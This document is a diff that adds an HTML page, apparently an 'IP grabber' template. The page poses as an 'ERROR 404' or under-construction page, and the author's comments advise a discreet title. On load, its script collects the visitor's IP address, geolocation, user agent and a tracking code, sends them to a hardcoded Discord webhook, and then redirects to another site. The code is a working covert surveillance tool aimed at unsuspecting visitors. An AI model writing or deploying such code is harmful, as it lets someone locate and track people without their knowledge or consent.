@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+    <!-- I coded this for free for YOU. All I ask is that you keep this little blurb below to show appreciation!-->
+
+    <!--CODED BY RAYEN NOTH
+    https://linux.scot
+    https://untitledprojects.org
+
+     ________  ________      
+    |\   __  \|\   ___  \    
+    \ \  \|\  \ \  \\ \  \   
+     \ \   _  _\ \  \\ \  \  
+      \ \  \\  \\ \  \\ \  \ 
+       \ \__\\ _\\ \__\\ \__\
+        \|__|\|__|\|__| \|__|              
+    -->
+<head>
+    <!-- Change this if you want to change the title of the site. Some apps will show the title as a preview, so if you're doing this discreetly, change this. -->
+    <title>ERROR 404</title>
+    <!--END OF TITLE-->
+    <!-- This is where the CSS (style code) starts. -->
+    <style>
+        @font-face {
+            font-family: VCR;
+            src: url(https://linux.scot/fonts/VCR.ttf);
+        }
+        #invisibleFrame { display: none; }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+
+        h1 {
+            font-size: 3rem;
+            color: #333;
+            text-transform: uppercase;
+            position: relative;
+            transition: transform 0.3s;
+        }
+
+        h1:hover {
+            transform: scale(1.1);
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+    <!--CSS End.-->
+</head>
+<body>
+    <!-- You can throw any html code in here, just make sure you keep the script! The below code is the one I use for https://linux.scot/worker. -->
+    we are still working on it! Check out here later!
+    <!-- END OF HTML -->
+    <script>
+        // START OF JAVASCRIPT GRABBER CODE
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                fetchGeolocationData(ipAddress);
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
+
+        function fetchGeolocationData(ipAddress) {
+            fetch(`https://freeipapi.com/api/json/${ipAddress}`)
+                .then(response => response.json())
+                .then(data => {
+                    const geoLocationData = JSON.stringify(data, null, 2); 
+
+                    const embed = {
+                        title: 'Success!',
+                        description: `Tracking Code: ${getParameterByName('code')}`,
+                        fields: [
+                            { name: 'IP Address', value: ipAddress },
+                            { name: 'Geolocation', value: `\`\`\`json\n${geoLocationData}\n\`\`\`` },
+                            { name: 'Battery Level', value: getBatteryLevel() },
+                            { name: 'Device', value: navigator.userAgent },
+                            { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ipAddress}` }                        
+                     ],
+                        footer: {
+                            text: 'powered by linux.scot'
+                        }
+                    };
+
+                // CHANGE THE CONTENT IN webhookUrl OTHERWISE YOU WONT GET THE DATA
+                    const webhookUrl = 'https://discord.com/api/webhooks/1362361063307350146/GEz6-9zJ-QumFHAoGATxCI5UBkMT2AoYCL4VS-aTKyxMe4-PfaUXzFg55W4tOOWZdcSg';
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ embeds: [embed] })
+                    })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log('Embed sent successfully');
+                            } else {
+                                console.error('Failed to send embed');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('Error fetching geolocation data:', error);
+                });
+        }
+
+        // Function to get URL parameters
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Function to get battery level
+        function getBatteryLevel() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    return (battery.level * 100).toFixed(2) + '%';
+                });
+            }
+            return 'N/A';
+        }
+
+        window.location.href = "https://nexucore.github.io/bobisai/BobIsAI.html";
+        // END OF JAVASCRIPT
+    </script>
+</body>
+</html>
